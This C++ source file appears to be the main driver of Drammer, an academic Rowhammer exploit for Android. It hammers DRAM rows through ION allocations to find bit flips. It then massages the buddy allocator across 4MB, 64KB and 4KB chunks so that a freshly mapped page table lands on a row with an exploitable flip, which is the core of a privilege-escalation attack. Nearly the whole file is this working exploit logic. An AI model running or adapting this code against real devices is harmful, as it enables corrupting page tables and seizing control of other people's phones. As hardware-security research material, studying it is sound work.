/*
 * Copyright 2016, Victor van der Veen
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <algorithm>
#include <fstream>
#include <iostream>
#include <set>
#include <string>

#include <assert.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include "helper.h"
#include "ion.h"
#include "massage.h"
#include "rowsize.h"
#include "templating.h"
#include "log/src/log.h"

#define HAMMER_READCOUNT 1000000

FILE *global_of = NULL;

extern int rowsize;



void usage(char *main_program) {
    fprintf(stderr,"Usage: %s [-a] [-c count] [-d seconds] [-f file] [-h] [-i] [-q cpu] [-r rowsize] [-t timer]\n", main_program);
    fprintf(stderr,"   -a        : Run all pattern combinations\n");
    fprintf(stderr,"   -c count  : Number of memory accesses per hammer round (default is %d)\n",HAMMER_READCOUNT);
    fprintf(stderr,"   -d seconds: Number of seconds to run defrag (default is disabled)\n");
    fprintf(stderr,"   -f file   : Write output to this file\n"); 
    fprintf(stderr,"   -h        : This help\n");
    fprintf(stderr,"   -i        : Run ion heap type detector\n");
    fprintf(stderr,"   -q cpu    : Pin to this CPU\n");
    fprintf(stderr,"   -r rowsize: Rowsize of DRAM module in B (autodetect if not specified)\n");
    fprintf(stderr,"   -s        : Hammer more conservative (currently set to hammering every 64 bytes)\n");
    fprintf(stderr,"   -t timer  : Number of seconds to hammer (default is to hammer everything)\n");
    fprintf(stderr,"   -o        : Original version of this program (templating only)\n");
    fprintf(stderr,"   -e        : Experimental stuff\n");
}

void resetter(uint8_t *pattern) {
    for (int i = 0; i < MAX_ROWSIZE; i++) {
        pattern[i] = rand() % 255;
    }
}


int main(int argc, char *argv[]) {
    // int tmp = open("/proc/self/pagemap", O_RDONLY);
    // if (tmp < 0) {
    //     printf("Fail to open pagemap, pagemap_fd = %d\n", tmp);
    //     return -1;
    // } else {
    //     printf("Success.\n");
    // }
//    printf("______   ______ _______ _______ _______ _______  ______  \n");
//    printf("|     \\ |_____/ |_____| |  |  | |  |  | |______ |_____/ \n");
//    printf("|_____/ |    \\_ |     | |  |  | |  |  | |______ |    \\_\n");
//    printf("\n");

    int c;
    int timer = 0;
    int alloc_timer = 0;
    char *outputfile = NULL;
    int hammer_readcount = HAMMER_READCOUNT;
    bool heap_type_detector = false;
    bool do_conservative = false;
    bool all_patterns = false;
    bool original = false;
    bool experimental = false;
    int cpu_pinning = -1;
    opterr = 0;
    while ((c = getopt(argc, argv, "sac:d:f:hiq:r:t:oe")) != -1) {
        switch (c) {
            case 'a':
                all_patterns = true;
                break;
            case 'c':
                hammer_readcount = strtol(optarg, NULL, 10);
                break;
            case 'd':
                alloc_timer = strtol(optarg, NULL, 10);
                break;
            case 'f':
                outputfile = optarg;
                break;
            case 'h':
                usage(argv[0]);
                return 0;
            case 'i':
                heap_type_detector = true;
                break;
            case 'q':
                cpu_pinning = strtol(optarg, NULL, 10);
                break;
            case 'r':
                rowsize = strtol(optarg, NULL, 10);
                break;
            case 's':
                do_conservative = true;
                break;
            case 't':
                timer = strtol(optarg, NULL, 10);
                break;
            case 'o':
                original = true;
                break;
            case 'e':
                experimental = true;
                break;
            case '?':
                if (optopt == 'c' || optopt == 'd' || optopt == 'f' || optopt == 'q' || optopt == 'r' || optopt == 't') 
                    fprintf(stderr, "Option -%c requires an argument.\n", optopt);
                else if (isprint(optopt))
                    fprintf(stderr,"Unknown option `-%c'.\n", optopt);
                else
                    fprintf(stderr,"Unknown option character `\\x%x'.\n", optopt);
                usage(argv[0]);
                return 1;
            default:
                abort();
        }
    }

    if (experimental) {
        uint8_t *start = (uint8_t *)0x14000000;
        uint8_t *p = start;
        uint32_t interval = M(2);
        uint32_t length = K(4);
        uint32_t count = 128*4;
        uint32_t free_before[11], free_mid[11], free_after[11];
        get_maps_info();
        get_buddy_info("Normal", free_before);
        get_status_info("VmPTE");
        for (uint32_t i = 0; i < count; i++) {
            mmap(p, length, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            uint8_t *q = p;
            *q = 0xFF;
            p = p + interval;
//            get_buddy_info("Normal");
//            // get_status_info affects page allocation stability. Only used when observing.
//            get_status_info("VmPTE");
        }
        get_buddy_info("Normal", free_mid);
//        get_status_info("VmPTE");

        p = start;
        for (uint32_t i = 0; i < count; i++) {
            munmap(p, length);
            p = p + interval;
        }

//        get_maps_info();
        get_buddy_info("Normal", free_after);
//        get_status_info("VmPTE");

        int dif_mid = 0, dif_after = 0;
        for (uint32_t i = 0; i < 11; i++) {
            dif_mid = dif_mid + (((int)free_mid[i] - (int)free_before[i]) << i);
        }
        for (uint32_t i = 0; i < 11; i++) {
            dif_after = dif_after + (((int)free_after[i] - (int)free_before[i]) << i);
        }
        printf("Page count differences between start and mid: %d\n", dif_mid);
        printf("Page count differences between start and end: %d\n", dif_after);

        helper_clean();
        return 0;
    }


    printf("[MAIN] ION init\n");
    ION_init();
    
    std::vector<struct ion_data *> ion_chunks;
    std::vector<struct template_t *> templates;

    if (outputfile != NULL) {
        global_of = fopen(outputfile, "w");
        if (global_of == NULL) {
            perror("could not open output file");
            exit(0);
        }
        setvbuf(global_of, NULL, _IONBF, 0);
    }
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    

    if (heap_type_detector) {
        ION_detector();
        return 0;
    }
    
    if (cpu_pinning != -1) {
        printf("[MAIN] Pinning to CPU...\n");
        cpu_set_t cpuset;
        CPU_ZERO(&cpuset);
        CPU_SET(cpu_pinning, &cpuset);
        if (sched_setaffinity(0, sizeof(cpuset), &cpuset)) {
            perror("Could not pin CPU");
        }
    }

    /*** DEFRAG MEMORY */
    if (alloc_timer) {
        printf("[MAIN] Defragment memory\n");
        defrag(alloc_timer);
    }
    
    /*** ROW SIZE DETECTION (if not specified) */
    if (!VALID_ROWSIZES.count(rowsize)) {
        printf("[MAIN] No or weird row size provided, trying auto detect\n");
        rowsize = RS_autodetect();
    }
    // 65536 for Nexus 5
    print("[MAIN] Row size: %d\n", rowsize);

    /* patterns:  above      victim     below
     * p000       0x00000000 0x00000000 0x00000000
     * p001       0x00000000 0x00000000 0xffffffff
     * p010       0x00000000 0xffffffff 0x00000000  <-- default
     * p011       0x00000000 0xffffffff 0xffffffff
     * p100       0xffffffff 0x00000000 0x00000000
     * p101       0xffffffff 0x00000000 0xffffffff  <-- default
     * p110       0xffffffff 0xffffffff 0x00000000
     * p111       0xffffffff 0xffffffff 0xffffffff
     * 
     * p00r       0x00000000 0x00000000 0x<RANDOM>
     * p0r0       0x00000000 0x<RANDOM> 0x00000000
     * p0rr       0x00000000 0x<RANDOM> 0x<RANDOM>
     * pr00       0x<RANDOM> 0x00000000 0x00000000
     * pr0r       0x<RANDOM> 0x00000000 0x<RANDOM>
     * prr0       0x<RANDOM> 0x<RANDOM> 0x00000000
     * prrr       0x<RANDOM> 0x<RANDOM> 0x<RANDOM>
     */
    
    printf("[MAIN] Initializing patterns\n");
    uint8_t  ones[MAX_ROWSIZE];
    uint8_t zeros[MAX_ROWSIZE];
    uint8_t rand1[MAX_ROWSIZE];
    uint8_t rand2[MAX_ROWSIZE];
    uint8_t rand3[MAX_ROWSIZE];
    memset( ones, 0xff, MAX_ROWSIZE);
    memset(zeros, 0x00, MAX_ROWSIZE);
    for (int i = 0; i < MAX_ROWSIZE; i++) {
        rand1[i] = rand() % 255;
        rand2[i] = rand() % 255;
        rand3[i] = rand() % 255;
    }

    pattern_t p000 = { .above = zeros, .victim = zeros, .below = zeros, .cur_use = 0, .max_use = 0, .reset_above = NULL, .reset_victim = NULL, .reset_below = NULL };
    pattern_t p001 = { .above = zeros, .victim = zeros, .below =  ones, .cur_use = 0, .max_use = 0, .reset_above = NULL, .reset_victim = NULL, .reset_below = NULL };
    pattern_t p010 = { .above = zeros, .victim =  ones, .below = zeros, .cur_use = 0, .max_use = 0, .reset_above = NULL, .reset_victim = NULL, .reset_below = NULL };
    pattern_t p011 = { .above = zeros, .victim =  ones, .below =  ones, .cur_use = 0, .max_use = 0, .reset_above = NULL, .reset_victim = NULL, .reset_below = NULL };
    pattern_t p100 = { .above =  ones, .victim = zeros, .below = zeros, .cur_use = 0, .max_use = 0, .reset_above = NULL, .reset_victim = NULL, .reset_below = NULL };
    pattern_t p101 = { .above =  ones, .victim = zeros, .below =  ones, .cur_use = 0, .max_use = 0, .reset_above = NULL, .reset_victim = NULL, .reset_below = NULL };
    pattern_t p110 = { .above =  ones, .victim =  ones, .below = zeros, .cur_use = 0, .max_use = 0, .reset_above = NULL, .reset_victim = NULL, .reset_below = NULL };
    pattern_t p111 = { .above =  ones, .victim =  ones, .below =  ones, .cur_use = 0, .max_use = 0, .reset_above = NULL, .reset_victim = NULL, .reset_below = NULL };

    pattern_t p00r = { .above = zeros, .victim = zeros, .below = rand3, .cur_use = 0, .max_use = 100, .reset_above =     NULL, .reset_victim =     NULL, .reset_below = resetter };
    pattern_t p0r0 = { .above = zeros, .victim = rand2, .below = zeros, .cur_use = 0, .max_use = 100, .reset_above =     NULL, .reset_victim = resetter, .reset_below =     NULL };
    pattern_t p0rr = { .above = zeros, .victim = rand2, .below = rand3, .cur_use = 0, .max_use = 100, .reset_above =     NULL, .reset_victim = resetter, .reset_below = resetter };
    pattern_t pr00 = { .above = rand1, .victim = zeros, .below = zeros, .cur_use = 0, .max_use = 100, .reset_above = resetter, .reset_victim =     NULL, .reset_below =     NULL };
    pattern_t pr0r = { .above = rand1, .victim = zeros, .below = rand1, .cur_use = 0, .max_use = 100, .reset_above = resetter, .reset_victim =     NULL, .reset_below = resetter };
    pattern_t prr0 = { .above = rand1, .victim = rand2, .below = zeros, .cur_use = 0, .max_use = 100, .reset_above = resetter, .reset_victim = resetter, .reset_below =     NULL };
    pattern_t prrr = { .above = rand1, .victim = rand2, .below = rand3, .cur_use = 0, .max_use = 100, .reset_above = resetter, .reset_victim = resetter, .reset_below = resetter };

    std::vector<struct pattern_t *> patterns;
    if (all_patterns) 
        patterns = {&p000, &p001, &p010, &p011, &p100, &p101, &p110, &p111, 
                           &p00r, &p0r0, &p0rr, &pr00, &pr0r, &prr0, &prrr};
    else
        patterns = {&p101, &p010};

    if (original) {
            /*** EXHAUST */
            printf("[MAIN] Exhaust ION chunks for templating\n");
            exhaust(ion_chunks, rowsize * 4);

            /*** TEMPLATE */
            printf("[MAIN] Start templating\n");
            TMPL_run(ion_chunks, templates, patterns, timer, hammer_readcount, do_conservative);
    } else {
        uint16_t run_cnt = 0;
        do {
            if (run_cnt) {
                ION_clean_all(ion_chunks);
                ion_chunks.clear();
                templates.clear();
            }
            run_cnt++;
            log_info("Run %u", run_cnt);
            get_buddy_info();

            // Exhaust L
            printf("[EXHAUST L] Exhaust L (4MB) ION chunks for templating\n");
            int count = ION_bulk(M(4), ion_chunks, 0);
            print("[EXHAUST L] %d L (4MB) ION chunks allocated \n", count);
            get_buddy_info();

            // Template L
            TMPL_run(ion_chunks, templates, patterns, timer, hammer_readcount, do_conservative);

            // check exploitable bits inside L
            struct template_t *first_expl = get_first_exploitable_flip(templates);
            if (first_expl == NULL) {
                printf("[TMPL] - No exploitable flip found.\n");
                continue;
            }

            // Exhaust M
            printf("[EXHAUST M] Exhaust M (64KB) ION chunks\n");
            count = ION_bulk(K(64), ion_chunks, 0, false);
            print("[EXHAUST M] %d M (64KB) ION chunks allocated \n", count);
            get_buddy_info();

            // Free L* with particular exploitable bit
            auto l_star_va = (uintptr_t) first_expl->ion_chunk->mapping;
            print("[FREE L] Free L* at va %p\n", first_expl->ion_chunk->mapping);
            print("[FREE L] Exploitable bit at va %p\n", first_expl->virt_addr);
            if (first_expl->virt_row == (uintptr_t)first_expl->ion_chunk->mapping) {
                printf("[FREE L] - M* at edge of L*\n");
                continue;
            }
            ION_clean(first_expl->ion_chunk);
            get_buddy_info();

            // Immediately exhaust M again
            printf("[EXHAUST M] Exhaust M (64KB) ION chunks again\n");
            count = ION_bulk(K(64), ion_chunks, 0, false);
            print("[EXHAUST M] %d M (64KB) ION chunks allocated \n", count);
            if (count != 64) {
                // M doesn't use free space of L*
                log_warn("[EXHAUST M] - size mismatch");
                continue;
            }
            get_buddy_info();

//            // Prints 0xb690... to 0xb6cf (means that addresses in the vector is in reversed order
//            count = 0;
//            for (auto it = ion_chunks.rbegin(); it != ion_chunks.rend(); it++) {
//                print("[MAIN] New M at va %p\n", (*it)->mapping);
//                count++;
//                if (count == 64) break;
//            }

            // Free M* and all L
            uint32_t m_star_idx = (first_expl->virt_row >> 16) - (l_star_va >> 16);
            log_debug("m_star_idx = %u", m_star_idx);
            ION_clean(ion_chunks.at(ion_chunks.size() - 1 - m_star_idx));

            for (auto chunk : ion_chunks) {
                if (chunk->len == M(4)) {
//                    print("[FREE L] Free %p, len %d\n", chunk->mapping, chunk->len);
                    ION_clean(chunk);
                }
            }
            get_buddy_info();

            // Allocate S until S start to land in M*
            // 0  1  2   3   4   5    6    7    8  9  10
            // 4K 8K 16K 32K 64k 128K 256K 512K 1M 2M 4M
            uint32_t free[11];
            get_buddy_info("Normal", free);
            if (free[4] != 1) {
                log_warn("[EXHAUST S] More than one 64K holes");
                continue;
            }
            while (true) {
                count = ION_bulk(K(4), ion_chunks, 1, false);
                if (count == 0) break;

                get_buddy_info("Normal", free);
                if (free[4] != 1) {
                    printf("[EXHAUST S] Meet 64K hole\n");
                    break;
                }
            }

            // Allocate padding S until the next place will be vulnerable
            uint32_t padding_num = (first_expl->virt_page - first_expl->virt_row) / PAGESIZE;
            printf("[PADDING] %#x, %#x\n", first_expl->virt_page, first_expl->virt_row);
            printf("[PADDING] Padding %u pages\n", padding_num);
            if (padding_num != 0) ION_bulk(K(4), ion_chunks, padding_num - 1,false);

            // Map appropriate p to allocate a new page table
            // Why 0xB6600000? See my script.
            void *p = (void *)(0xB6600000 | first_expl->word_index_in_pt << 12);
            get_status_info("VmPTE");
            void *q = mmap(p, K(4), PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            printf("[MAP P] Map p at %p, got %p\n", p, q);
            *(char *)q = 0xFF;
            get_status_info("VmPTE");

            break;
        } while(true);
        log_info("[MAIN] Run %u time(s)", run_cnt);
    }

    /*** CLEAN UP */
    ION_clean_all(ion_chunks);
    helper_clean();
    
    printf("[MAIN] ION fini\n");
    ION_fini();

    return 0;
}
